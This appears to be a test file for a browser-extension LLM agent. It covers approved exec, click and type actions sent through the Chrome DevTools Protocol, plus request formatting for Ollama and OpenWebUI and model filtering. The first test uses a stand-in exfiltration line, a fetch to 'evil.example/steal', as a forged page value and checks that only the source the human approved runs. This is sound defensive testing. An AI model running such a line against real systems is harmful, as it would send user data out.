// CDP EXEC routing (strict-CSP / Trusted-Types pages). Drive a full background run: the model calls exec, the
// human approves it (via the fanned gate), the delegated page-side eval is CSP-BLOCKED and hands back a
// cdpExec signal, and the background re-runs it via the debugger. The page echoes a DECOY source to prove the
// background runs only the human-APPROVED args.js (unforgeable), never the page's value.
async function driveCdpExec({ cdp, debuggerPermission = true, pageEcho, approvedJs = "await ml.fetch('https://api.example/x').then(r => r.type)", simulateLogs = [] }) {
    const evals = [];
    let toolResult = null, n = 0, bg;
    bg = loadBackground({
        config: baseConfig({ cdp }),
        debuggerPermission,
        // Simulate the page running cdpEval's console-capture WRAPPER: it patches console, runs the source,
        // and returns { __mlWrapped, v, logs } by value — so console output survives the CDP round-trip.
        onDebuggerCommand: (method, params) => { if (method === "Runtime.evaluate") { evals.push(params.expression); return { result: { value: { __mlWrapped: true, v: "CDP-RAN", logs: simulateLogs } } }; } },
        onFetch: (call) => {
            n++;
            if (n === 1) return jsonResponse({ choices: [{ message: { content: "", tool_calls: [{ id: "c1", type: "function", function: { name: "exec", arguments: JSON.stringify({ js: approvedJs }) } }] } }] });
            const msgs = call.body?.messages || [];
            const tr = [...msgs].reverse().find(m => m.role === "tool");
            toolResult = tr ? (typeof tr.content === "string" ? tr.content : JSON.stringify(tr.content)) : null;
            return jsonResponse({ choices: [{ message: { content: "done" } }] });
        },
        onTabMessage: async (tabId, msg) => {
            if (msg?.type === "ML_DEBUG_TO_PAGE" && msg.event?.awaitingApproval) {
                await bg.send({ type: "SET_APPROVAL", payload: { runId: msg.event.id, seq: msg.event.seq, decision: true } });
            }
            // The real exec run (not the renderOnly preview / readonly-try / precheck): main-world eval was
            // CSP-blocked → return the signal, echoing a DECOY source to prove the background ignores it.
            if (msg?.type === "RUN_TOOL_IN_PAGE" && msg.payload?.name === "exec" && !msg.payload?.renderOnly && !msg.payload?.readonlyTry && !msg.payload?.precheck) {
                return { result: "This page blocks main-world eval (CSP / Trusted Types).", cdpExec: { source: pageEcho } };
            }
            return undefined;
        },
    });
    const res = await bg.send({ type: "START_RUN", payload: {
        runId: "cx", task: "run it", systemPrompt: "S",
        tools: [{ name: "exec", requiresApproval: true, description: "", parameters: { type: "object", properties: { js: { type: "string" } } }, capabilities: [] }],
        model: "m", think: null, maxSteps: 5, autoApprovePython: false, autoApproveReadonly: false, surface: "devtools",
    } }, { tab: { id: 8 } });
    await new Promise(r => setTimeout(r, 0));   // let the run's .finally (releaseDebugger → detach) settle after sendResponse
    return { res, evals, toolResult, approvedJs, attached: bg.debuggerCalls.some(c => c[0] === "attach"), detached: bg.debuggerCalls.some(c => c[0] === "detach") };
}

test("CDP exec (ON + granted): a CSP-blocked exec re-runs the APPROVED source via the debugger — never the page's echo", async () => {
    const { evals, toolResult, approvedJs, attached, detached } = await driveCdpExec({ cdp: true, debuggerPermission: true, pageEcho: "fetch('https://evil.example/steal')" });
    assert.ok(attached && detached, "attached then ALWAYS detached");
    assert.ok(evals.length >= 1, "Runtime.evaluate ran");
    assert.ok(evals.some(e => e.includes("ml.fetch('https://api.example/x')")), "it evaluated the human-APPROVED args.js");
    assert.ok(!evals.some(e => e.includes("evil.example/steal")), "NEVER the page-echoed decoy source — unforgeable");
    assert.match(toolResult, /CDP-RAN/, "the CDP result reached the model");
    // The evaluated expression WRAPS the approved source with the console-capture harness, so a page's
    // console.log survives the CDP round-trip (the "logs got lost in CDP" fix) instead of vanishing.
    assert.ok(evals.some(e => /__logs/.test(e) && /console\[m\]/.test(e)), "the source is wrapped to capture console output");
    void approvedJs;
});

test("CDP exec: console.log output is captured and prefixed onto the value (not lost via CDP)", async () => {
    const { toolResult } = await driveCdpExec({
        cdp: true, debuggerPermission: true, pageEcho: "x",
        approvedJs: "console.log('before:', 3); return 42;",
        simulateLogs: ["before: 3", "after add: [\"apple\"]"],
    });
    // The main-world path's `console:\n…\n\nvalue: …` shape, reproduced on the CDP path.
    assert.match(toolResult, /console:/, "console output is surfaced");
    assert.match(toolResult, /before: 3/, "the logged lines reach the model");
    assert.match(toolResult, /value: CDP-RAN/, "the completion value is still there, after the logs");
});

test("CDP exec: TWO execs in one run share ONE debugger attachment (attach once, detach at run end — the perf fix)", async () => {
    // The reported slowness: every exec on a strict-CSP page paid a full attach/detach. Now the debugger is
    // attached once per run and reused, then detached in the run's finally.
    let n = 0, bg;
    bg = loadBackground({
        config: baseConfig({ cdp: true }),
        onDebuggerCommand: (method) => (method === "Runtime.evaluate" ? { result: { value: { __mlWrapped: true, v: "OK", logs: [] } } } : undefined),
        onFetch: () => {
            n++;
            if (n === 1) return jsonResponse({ choices: [{ message: { content: "", tool_calls: [{ id: "a", type: "function", function: { name: "exec", arguments: JSON.stringify({ js: "document.title" }) } }] } }] });
            if (n === 2) return jsonResponse({ choices: [{ message: { content: "", tool_calls: [{ id: "b", type: "function", function: { name: "exec", arguments: JSON.stringify({ js: "location.href" }) } }] } }] });
            return jsonResponse({ choices: [{ message: { content: "done" } }] });
        },
        onTabMessage: async (tabId, msg) => {
            if (msg?.type === "ML_DEBUG_TO_PAGE" && msg.event?.awaitingApproval) await bg.send({ type: "SET_APPROVAL", payload: { runId: msg.event.id, seq: msg.event.seq, decision: true } });
            if (msg?.type === "RUN_TOOL_IN_PAGE" && msg.payload?.name === "exec" && !msg.payload?.renderOnly && !msg.payload?.readonlyTry && !msg.payload?.precheck)
                return { result: "This page blocks main-world eval (CSP / Trusted Types).", cdpExec: { source: String(msg.payload.args?.js || "") } };
            return undefined;
        },
    });
    await bg.send({ type: "START_RUN", payload: {
        runId: "cx2", task: "run both", systemPrompt: "S",
        tools: [{ name: "exec", requiresApproval: true, description: "", parameters: { type: "object", properties: { js: { type: "string" } } }, capabilities: [] }],
        model: "m", think: null, maxSteps: 6, autoApprovePython: false, autoApproveReadonly: false, surface: "devtools",
    } }, { tab: { id: 8 } });
    await new Promise(r => setTimeout(r, 0));   // let the run's finally (detach) settle
    assert.equal(bg.debuggerCalls.filter(c => c[0] === "attach").length, 1, "attached exactly ONCE for two execs");
    assert.equal(bg.debuggerCalls.filter(c => c[0] === "detach").length, 1, "detached exactly ONCE, at run end");
    assert.ok(bg.debuggerCalls.filter(c => c[0] === "sendCommand").length >= 2, "both execs evaluated on the one attachment");
});

test("CDP exec (OFF): a CSP-blocked exec never attaches; the model gets an actionable 'enable CDP' note", async () => {
    const { evals, toolResult, attached } = await driveCdpExec({ cdp: false, pageEcho: "x" });
    assert.equal(attached, false, "never attached the debugger");
    assert.equal(evals.length, 0, "never evaluated anything");
    assert.match(toolResult, /OFF|enable them in window\.ml Settings|read-only survey/i, "told to enable it or fall back — never a silent failure");
});

test("CDP exec (ON + permission MISSING): never attaches; the model is told to grant debugger access", async () => {
    const { evals, toolResult, attached } = await driveCdpExec({ cdp: true, debuggerPermission: false, pageEcho: "x" });
    assert.equal(attached, false, "no attach without the permission");
    assert.equal(evals.length, 0, "never evaluated");
    assert.match(toolResult, /debugger.*(isn't granted|permission)|Settings/i, "actionable: grant debugger access");
});

// --- CDP SHADOW RESOLVER (reach a SEALED closed/declarative shadow root the JS path can't enter) ---
// Simulate the CDP DOM resolution of `sealed-host >>> .inner`: querySelectorAll finds the host (nodeId 10) in
// the light DOM; describeNode(pierce) exposes its CLOSED shadow root (nodeId 20); querySelectorAll inside it
// finds the inner element (nodeId 30); resolveNode + callFunctionOn read its describe line + click centre.
function shadowCdp(method, params) {
    if (method === "DOM.getDocument") return { root: { nodeId: 1 } };
    if (method === "DOM.querySelectorAll") {
        if (params.nodeId === 1 && params.selector === "sealed-host") return { nodeIds: [10] };
        if (params.nodeId === 20 && params.selector === ".inner") return { nodeIds: [30] };
        return { nodeIds: [] };
    }
    if (method === "DOM.describeNode" && params.nodeId === 10) return { node: { shadowRoots: [{ nodeId: 20 }] } };
    if (method === "DOM.resolveNode" && params.nodeId === 30) return { object: { objectId: "obj30" } };
    if (method === "Runtime.callFunctionOn" && params.objectId === "obj30") return { result: { value: { line: 'button.inner "Go"', cx: 50, cy: 60, w: 40, h: 20 } } };
    return undefined;   // Runtime.releaseObject etc.
}

test("CDP_SHADOW_RESOLVE reads inside a SEALED closed shadow root via CDP (read-only: never clicks)", async () => {
    const clicks = [];
    const bg = loadBackground({ config: baseConfig({ cdp: true }), onDebuggerCommand: (m, p) => { if (m === "Input.dispatchMouseEvent") clicks.push(p); return shadowCdp(m, p); } });
    const res = await bg.send({ type: "CDP_SHADOW_RESOLVE", payload: { selector: "sealed-host >>> .inner", tabId: 7 } }, { tab: { id: 7, url: "https://x.test/" } });
    assert.deepEqual(res.data, [{ line: 'button.inner "Go"', cx: 50, cy: 60, w: 40, h: 20 }], "resolved the sealed inner element via CDP");
    assert.equal(clicks.length, 0, "READ-ONLY: it dispatches no click");
    assert.ok(bg.debuggerCalls.some(c => c[0] === "attach"), "attached the debugger to read");
});

test("CDP_SHADOW_RESOLVE is refused when the cdp flag is off (never attaches)", async () => {
    const bg = loadBackground({ config: baseConfig({ cdp: false }) });
    const res = await bg.send({ type: "CDP_SHADOW_RESOLVE", payload: { selector: "sealed-host >>> .inner", tabId: 7 } }, { tab: { id: 7 } });
    assert.match(res.error, /off|enable/i, "actionable: enable CDP");
    assert.equal(bg.debuggerCalls.length, 0, "never attached the debugger");
});

// Drive a full background run: the model calls click on a `>>>` path into a sealed root, the human approves,
// the page can't enter the root and hands back a cdpShadowClick signal, and the trusted background CDP-resolves
// the selector then clicks the resolved coordinate — so a sealed root never dead-ends at locate/@pt.
async function driveCdpShadowClick({ cdp, resolveEmpty = false }) {
    const clicks = [];
    let toolResult = null, n = 0, bg;
    const sel = "sealed-host >>> .inner";
    bg = loadBackground({
        config: baseConfig({ cdp }),
        onDebuggerCommand: (m, p) => {
            if (m === "Input.dispatchMouseEvent") { clicks.push(p); return undefined; }
            if (resolveEmpty && m === "DOM.querySelectorAll" && p.selector === ".inner") return { nodeIds: [] };
            return shadowCdp(m, p);
        },
        onFetch: (call) => {
            n++;
            if (n === 1) return jsonResponse({ choices: [{ message: { content: "", tool_calls: [{ id: "c1", type: "function", function: { name: "click", arguments: JSON.stringify({ selector: sel }) } }] } }] });
            const msgs = call.body?.messages || [];
            const tr = [...msgs].reverse().find(m => m.role === "tool");
            toolResult = tr ? (typeof tr.content === "string" ? tr.content : JSON.stringify(tr.content)) : null;
            return jsonResponse({ choices: [{ message: { content: "done" } }] });
        },
        onTabMessage: async (tabId, msg) => {
            if (msg?.type === "ML_DEBUG_TO_PAGE" && msg.event?.awaitingApproval) {
                await bg.send({ type: "SET_APPROVAL", payload: { runId: msg.event.id, seq: msg.event.seq, decision: true } });
            }
            if (msg?.type === "RUN_TOOL_IN_PAGE" && msg.payload?.name === "click" && !msg.payload?.renderOnly && !msg.payload?.precheck) {
                return { result: "sealed shadow — resolving via the debugger.", cdpShadowClick: { selector: sel } };
            }
            return undefined;
        },
    });
    await bg.send({ type: "START_RUN", payload: {
        runId: "cs", task: "click it", systemPrompt: "S",
        tools: [{ name: "click", requiresApproval: true, description: "", parameters: { type: "object", properties: { selector: { type: "string" } } }, capabilities: [] }],
        model: "m", think: null, maxSteps: 5, autoApprovePython: false, autoApproveReadonly: false, surface: "devtools",
    } }, { tab: { id: 8 } });
    await new Promise(r => setTimeout(r, 0));   // let the run's .finally (releaseDebugger) settle
    return { toolResult, clicks, attached: bg.debuggerCalls.some(c => c[0] === "attach") };
}

test("delegated cdpShadowClick (ON): a sealed `>>>` click is CDP-resolved, then clicked at the resolved coordinate", async () => {
    const { toolResult, clicks, attached } = await driveCdpShadowClick({ cdp: true });
    assert.ok(attached, "attached the debugger");
    assert.equal(clicks.length, 2, "press + release dispatched");
    assert.equal(clicks[0].x, 50, "clicked the resolved centre X"); assert.equal(clicks[0].y, 60, "…and Y");
    assert.match(toolResult, /sealed shadow root via the debugger/i, "the model is told it clicked inside a sealed root via CDP");
});

test("delegated cdpShadowClick (OFF): nothing clicks; the model is told to enable CDP", async () => {
    const { toolResult, clicks, attached } = await driveCdpShadowClick({ cdp: false });
    assert.equal(attached, false, "never attached"); assert.equal(clicks.length, 0, "no click");
    assert.match(toolResult, /sealed shadow root needs a debugger|enable "Debugger/i, "actionable: enable CDP");
});

test("delegated cdpShadowClick: the resolver finds nothing → honest 'no match', no click", async () => {
    const { toolResult, clicks } = await driveCdpShadowClick({ cdp: true, resolveEmpty: true });
    assert.equal(clicks.length, 0, "nothing resolved → nothing clicked");
    assert.match(toolResult, /couldn't reach|no match/i, "honest failure, not a phantom click");
});

// TRUSTED KEYBOARD (canvas / WebGL / remote desktop / sealed): a `type` call hands back a cdpType signal and
// the background types real key events via CDP. `mode` = "focus" (current focus, no click) | "pt" (click a
// coordinate to focus first) | "sealed" (CDP-resolve a `>>>` field, then click to focus).
async function driveCdpType({ cdp, mode = "focus", text = "hi", submit = false }) {
    const keys = [], mouse = [];
    let toolResult = null, n = 0, bg;
    const env = mode === "focus" ? { cdpType: { text, submit } }
        : mode === "pt" ? { cdpType: { x: 120, y: 340, text, submit } }
        : { cdpType: { selector: "sealed-host >>> .inner", text, submit } };
    bg = loadBackground({
        config: baseConfig({ cdp }),
        onDebuggerCommand: (m, p) => {
            if (m === "Input.dispatchKeyEvent") { keys.push(p); return undefined; }
            if (m === "Input.dispatchMouseEvent") { mouse.push(p); return undefined; }
            return shadowCdp(m, p);   // resolves the sealed selector for mode:"sealed"
        },
        onFetch: (call) => {
            n++;
            if (n === 1) return jsonResponse({ choices: [{ message: { content: "", tool_calls: [{ id: "c1", type: "function", function: { name: "type", arguments: JSON.stringify({ selector: "@focus", text }) } }] } }] });
            const tr = [...(call.body?.messages || [])].reverse().find(m => m.role === "tool");
            toolResult = tr ? (typeof tr.content === "string" ? tr.content : JSON.stringify(tr.content)) : null;
            return jsonResponse({ choices: [{ message: { content: "done" } }] });
        },
        onTabMessage: async (tabId, msg) => {
            if (msg?.type === "ML_DEBUG_TO_PAGE" && msg.event?.awaitingApproval) {
                await bg.send({ type: "SET_APPROVAL", payload: { runId: msg.event.id, seq: msg.event.seq, decision: true } });
            }
            if (msg?.type === "RUN_TOOL_IN_PAGE" && msg.payload?.name === "type" && !msg.payload?.renderOnly && !msg.payload?.precheck) return env;
            return undefined;
        },
    });
    await bg.send({ type: "START_RUN", payload: {
        runId: "ct", task: "type it", systemPrompt: "S",
        tools: [{ name: "type", requiresApproval: true, description: "", parameters: { type: "object", properties: { selector: { type: "string" }, text: { type: "string" } } }, capabilities: [] }],
        model: "m", think: null, maxSteps: 5, autoApprovePython: false, autoApproveReadonly: false, surface: "devtools",
    } }, { tab: { id: 8 } });
    await new Promise(r => setTimeout(r, 0));
    return { toolResult, keys, mouse, attached: bg.debuggerCalls.some(c => c[0] === "attach") };
}

test("delegated cdpType (focus mode): types real key events into the current focus, no click", async () => {
    const { toolResult, keys, mouse } = await driveCdpType({ cdp: true, text: "hi", submit: true });
    assert.equal(mouse.length, 0, "current-focus mode does NOT click");
    // "hi" = 2 chars × (keyDown+keyUp) + Enter (keyDown+keyUp) = 6 key events.
    assert.equal(keys.length, 6, "per-char down/up + an Enter for submit");
    assert.ok(keys.some(k => k.text === "h") && keys.some(k => k.text === "i"), "the characters were dispatched");
    assert.ok(keys.some(k => k.key === "Enter"), "submit pressed Enter");
    assert.match(toolResult, /trusted keyboard/i, "the model is told it typed via the debugger");
});

test("delegated cdpType (@pt mode): clicks the coordinate to focus, THEN types", async () => {
    const { keys, mouse } = await driveCdpType({ cdp: true, mode: "pt", text: "ab" });
    assert.equal(mouse.length, 2, "a trusted press+release click focuses the point first");
    assert.equal(keys.length, 4, "then two chars, down/up each");
});

test("delegated cdpType (sealed field): CDP-resolves the `>>>` field, focuses it, then types", async () => {
    const { keys, mouse } = await driveCdpType({ cdp: true, mode: "sealed", text: "x" });
    assert.equal(mouse.length, 2, "resolved the sealed field then clicked to focus it");
    assert.equal(keys.length, 2, "one char typed via trusted keyboard");
});

test("delegated cdpType (OFF): nothing is typed; the model is told to enable CDP", async () => {
    const { toolResult, keys, attached } = await driveCdpType({ cdp: false, text: "hi" });
    assert.equal(attached, false, "never attached"); assert.equal(keys.length, 0, "no keys dispatched");
    assert.match(toolResult, /Trusted keyboard input.*needs a debugger|enable "Debugger/i, "actionable: enable CDP");
});

test("FETCH_LLM openai schema becomes a json_schema response_format", async () => {
    const schema = { type: "object", properties: { hide: { type: "boolean" } } };
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.deepEqual(call.body.response_format, {
                type: "json_schema",
                json_schema: { name: "response", strict: true, schema }
            });
            assert.ok(!("format" in call.body));
            return jsonResponse({ choices: [{ message: { content: "{\"hide\":true}" } }] });
        }
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "hi" }], schema }
    });
    assert.equal(res.data, "{\"hide\":true}");
});

test("FETCH_LLM ollama schema becomes the native format field", async () => {
    const schema = { type: "object", properties: { hide: { type: "boolean" } } };
    const bg = loadBackground({
        config: baseConfig({ apiFormat: "ollama", chatUrl: "http://host/ollama/api/chat" }),
        onFetch: (call) => {
            assert.deepEqual(call.body.format, schema);
            assert.ok(!("response_format" in call.body));
            return jsonResponse({ message: { content: "{\"hide\":true}" } });
        }
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "hi" }], schema }
    });
    assert.equal(res.data, "{\"hide\":true}");
});

test("FETCH_LLM omits format fields when no schema is given", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.ok(!("response_format" in call.body));
            assert.ok(!("format" in call.body));
            return jsonResponse({ choices: [{ message: { content: "ok" } }] });
        }
    });

    await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "hi" }] }
    });
});

test("FETCH_LLM raw mode returns normalized tool_calls (openai, string args)", async () => {
    const tools = [{ type: "function", function: { name: "readDom", parameters: {} } }];
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.deepEqual(call.body.tools, tools);
            return jsonResponse({ choices: [{ message: {
                content: null,
                tool_calls: [{ id: "call_abc", function: { name: "readDom", arguments: '{"selector":".menu"}' } }]
            } }] });
        }
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "go" }], tools, raw: true }
    });
    assert.deepEqual(res.data, {
        content: null,
        tool_calls: [{ id: "call_abc", name: "readDom", arguments: { selector: ".menu" } }],
        reasoning: null,   // no reasoning_content in this reply
        usage: null,   // this mock reports no counts
    });
});

test("FETCH_LLM raw mode normalizes Ollama tool_calls (object args)", async () => {
    const bg = loadBackground({
        config: baseConfig({ apiFormat: "ollama", chatUrl: "http://host/ollama/api/chat" }),
        onFetch: () => jsonResponse({ message: {
            content: "",
            tool_calls: [{ function: { name: "readDom", arguments: { selector: ".menu" } } }]
        } })
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "go" }], raw: true }
    });
    assert.equal(res.data.tool_calls[0].name, "readDom");
    assert.deepEqual(res.data.tool_calls[0].arguments, { selector: ".menu" });
    assert.equal(res.data.tool_calls[0].id, "call_0");
});

test("FETCH_LLM passes toolIds to OpenWebUI as tool_ids (openai)", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.deepEqual(call.body.tool_ids, ["web_search"]);
            // Forces a server-side execution mode so OpenWebUI runs the tool and
            // returns finished content. The exact label is version-dependent
            // ("legacy" on v0.10.0+, "default" on older); the invariant is that
            // it is NOT "native", which hands back an unexecuted tool_call.
            assert.ok(call.body.params.function_calling);
            assert.notEqual(call.body.params.function_calling, "native");
            return jsonResponse({ choices: [{ message: { content: "answer" } }] });
        }
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "weather?" }], toolIds: ["web_search"] }
    });
    assert.equal(res.data, "answer");
});

test("FETCH_LLM does not set function_calling when no toolIds", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.equal(call.body.params, undefined);
            return jsonResponse({ choices: [{ message: { content: "hi" } }] });
        }
    });

    await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "hi" }] }
    });
});

// OpenWebUI hands back an unexecuted tool_call (empty content + tool_calls) when
// the function_calling mode wasn't the server-side loop. We retry with the next
// mode label rather than sniffing the version.
const handedBack = () => jsonResponse({
    choices: [{
        finish_reason: "tool_calls",
        message: {
            content: "",
            tool_calls: [{ id: "c1", type: "function", function: { name: "get_x", arguments: "{}" } }]
        }
    }]
});

test("FETCH_LLM retries a handed-back tool call with the fallback mode", async () => {
    const modes = [];
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            modes.push(call.body.params.function_calling);
            // First mode: server hands the call back unexecuted; second: it runs.
            return modes.length === 1
                ? handedBack()
                : jsonResponse({ choices: [{ message: { content: "done" } }] });
        }
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "go" }], toolIds: ["t"] }
    });
    assert.equal(res.data, "done");
    assert.deepEqual(modes, ["legacy", "default"]);
    assert.equal(bg.calls.length, 2);
});

test("FETCH_LLM throws a clear error when the tool call is never executed", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => handedBack()
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "go" }], toolIds: ["t"] }
    });
    assert.match(res.error, /without executing it/);
    assert.equal(bg.calls.length, 2);     // tried each mode, then gave up
});

test("FETCH_LLM rejects toolIds on the Ollama-native format", async () => {
    const bg = loadBackground({
        config: baseConfig({ apiFormat: "ollama", chatUrl: "http://host/ollama/api/chat" }),
        onFetch: () => assert.fail("no request should be sent")
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "x" }], toolIds: ["web_search"] }
    });
    assert.match(res.error, /requires OpenWebUI/);
    assert.equal(bg.calls.length, 0);
});

test("FETCH_LLM builds tool-call and tool-result messages (openai wire shape)", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            const [asst, toolMsg] = call.body.messages;
            assert.deepEqual(asst.tool_calls[0], {
                id: "call_0", type: "function",
                function: { name: "readDom", arguments: '{"selector":".x"}' }
            });
            assert.deepEqual(toolMsg, { role: "tool", tool_call_id: "call_0", content: "result text" });
            return jsonResponse({ choices: [{ message: { content: "done" } }] });
        }
    });

    await bg.send({ type: "FETCH_LLM", payload: { raw: true, messages: [
        { role: "assistant", content: null, tool_calls: [{ id: "call_0", name: "readDom", arguments: { selector: ".x" } }] },
        { role: "tool", tool_call_id: "call_0", content: "result text" }
    ] } });
});

test("FETCH_LLM omits tool_call_id in tool results for Ollama", async () => {
    const bg = loadBackground({
        config: baseConfig({ apiFormat: "ollama", chatUrl: "http://host/ollama/api/chat" }),
        onFetch: (call) => {
            const toolMsg = call.body.messages.find(m => m.role === "tool");
            assert.deepEqual(toolMsg, { role: "tool", content: "r" });
            assert.ok(!("tool_call_id" in toolMsg));
            return jsonResponse({ message: { content: "done" } });
        }
    });

    await bg.send({ type: "FETCH_LLM", payload: { raw: true, messages: [
        { role: "tool", tool_call_id: "call_0", content: "r" }
    ] } });
});

test("FETCH_LLM explains a response shape mismatch", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => jsonResponse({ detail: "weird" })
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "hi" }] }
    });
    assert.match(res.error, /"openai" format/);
    assert.match(res.error, /choices\[0\]\.message\.content/);
    assert.match(res.error, /detail/);
});

test("SET_MODEL validates against the server list and persists", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.equal(call.url, "http://host/api/models");
            return jsonResponse({ data: [{ id: "a" }, { id: "b" }] });
        }
    });

    const ok = await bg.send({ type: "SET_MODEL", payload: { model: "b" } });
    assert.deepEqual(ok, { data: "b" });
    assert.equal(bg.stored.model, "b");

    const bad = await bg.send({ type: "SET_MODEL", payload: { model: "zzz" } });
    assert.match(bad.error, /Unknown model "zzz"/);
    assert.match(bad.error, /a, b/);
    assert.equal(bg.stored.model, "b"); // unchanged
});

test("model filter: FETCH_LLM blocks a model outside the whitelist, allows a matching one", async () => {
    const bg = loadBackground({
        config: baseConfig({ modelFilter: "^qwen" }),
        onFetch: () => jsonResponse({ choices: [{ message: { content: "ok" } }] }),
    });
    const blocked = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], model: "gpt-4o" } });
    assert.match(blocked.error, /blocked by the model filter/);
    const ok = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], model: "qwen3:14b" } });
    assert.equal(ok.data, "ok");
});

test("model filter: an invalid regex fails OPEN (a typo doesn't brick every call)", async () => {
    const bg = loadBackground({
        config: baseConfig({ modelFilter: "([" }),   // not a valid regex
        onFetch: () => jsonResponse({ choices: [{ message: { content: "ok" } }] }),
    });
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], model: "gpt-4o" } });
    assert.equal(res.data, "ok", "invalid filter → no restriction, not a hard block");
});

test("model filter: LIST_MODELS hides non-matching models from callers", async () => {
    const bg = loadBackground({
        config: baseConfig({ modelFilter: "^qwen" }),
        onFetch: (call) => call.url === "http://host/api/models"
            ? jsonResponse({ data: [{ id: "qwen3:14b" }, { id: "gpt-4o" }, { id: "qwen2.5vl:7b" }] })
            : jsonResponse({ choices: [{ message: { content: "ok" } }] }),
    });
    const res = await bg.send({ type: "LIST_MODELS" });
    assert.deepEqual(res.data, ["qwen3:14b", "qwen2.5vl:7b"], "cloud model never surfaces to the caller");
});

test("model filter: SET_MODEL rejects an in-server model the whitelist excludes (with a clear reason)", async () => {
    const bg = loadBackground({
        config: baseConfig({ modelFilter: "^qwen" }),
        onFetch: (call) => call.url === "http://host/api/models"
            ? jsonResponse({ data: [{ id: "qwen3:14b" }, { id: "gpt-4o" }] })
            : jsonResponse({}),
    });
    // gpt-4o IS on the server, so it's not "unknown" — it's blocked by the filter, and
    // the error says so (the list stays unfiltered for validation to give this message).
    const res = await bg.send({ type: "SET_MODEL", payload: { model: "gpt-4o" } });
    assert.match(res.error, /blocked by the model filter/);
    assert.equal(bg.stored.model, baseConfig().model, "not persisted");
});

test("LIST_MODELS explains an empty server instead of route-hopping", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            // Valid route, valid response, zero models installed.
            assert.equal(call.url, "http://host/api/models");
            return jsonResponse({ data: [] });
        }
    });

    const res = await bg.send({ type: "LIST_MODELS" });
    assert.match(res.error, /no models installed/);
    assert.match(res.error, /ollama pull/);
    assert.equal(bg.calls.length, 1); // authoritative — no fallback probing
});

test("LIST_MODELS falls back across routes (HTML means wrong path)", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            if (call.url === "http://host/api/models") return htmlResponse(200);
            if (call.url === "http://host/v1/models") return htmlResponse(405);
            if (call.url === "http://host/api/tags") {
                return jsonResponse({ models: [{ name: "m1" }] });
            }
            assert.fail(`unexpected url ${call.url}`);
        }
    });

    const res = await bg.send({ type: "LIST_MODELS" });
    assert.deepEqual(res, { data: ["m1"], ollamaModels: ["m1"] });   // /api/tags → all local
});

test("LIST_MODELS marks Ollama-backed models (owned_by) vs external ones", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => jsonResponse({ data: [
            { id: "local:8b", owned_by: "ollama" },
            { id: "gpt-4o", owned_by: "openai" },
            { id: "arena", owned_by: "arena" },
        ] })
    });
    const res = await bg.send({ type: "LIST_MODELS" });
    assert.deepEqual(res.data, ["local:8b", "gpt-4o", "arena"]);
    assert.deepEqual(res.ollamaModels, ["local:8b"], "only the ollama-owned model is local");
});

test("LIST_MODELS reports ollamaModels: null when the source can't tell (/v1/models)", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            if (call.url === "http://host/api/models") return htmlResponse(200);
            if (call.url === "http://host/v1/models") return jsonResponse({ data: [{ id: "x" }] });
            assert.fail(`unexpected url ${call.url}`);
        }
    });
    const res = await bg.send({ type: "LIST_MODELS" });
    assert.deepEqual(res, { data: ["x"], ollamaModels: null });   // unknown, not "none"
});

test("LIST_SERVER_TOOLS returns the tool ids + their function specs (valid toolIds)", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.equal(call.url, "http://host/api/v1/tools/");
            assert.equal(call.opts.headers.Authorization, "Bearer sk-test");
            return jsonResponse([
                {
                    id: "searxng_web_search",
                    name: "SearXNG Web Search",
                    meta: { description: "Search the web." },
                    specs: [{ name: "search", description: "Run a query.", parameters: { type: "object", properties: { q: { type: "string" } } } }],
                },
                { id: "server:weather", name: "Weather API", meta: { description: "OpenAPI server." } },
                { id: "server:mcp:files", name: "Files", meta: {} },
            ]);
        }
    });

    const res = await bg.send({ type: "LIST_SERVER_TOOLS" });
    assert.deepEqual(res.data.map(t => [t.id, t.kind]), [
        ["searxng_web_search", "local"],
        ["server:weather", "openapi"],
        ["server:mcp:files", "mcp"],
    ]);
    assert.deepEqual(res.data[0].functions, [
        { name: "search", description: "Run a query.", parameters: { type: "object", properties: { q: { type: "string" } } } },
    ]);
    // A proxied server lists as one entry; OpenWebUI resolves its functions only at call time.
    assert.deepEqual(res.data[1].functions, []);
});

test("LIST_SERVER_TOOLS returns [] on a non-OpenWebUI server (no such concept)", async () => {
    // Bare Ollama 404s the route; OpenWebUI itself answers unknown GETs with the SPA HTML.
    for (const response of [htmlResponse(404), htmlResponse(200)]) {
        const bg = loadBackground({ config: baseConfig(), onFetch: () => response });
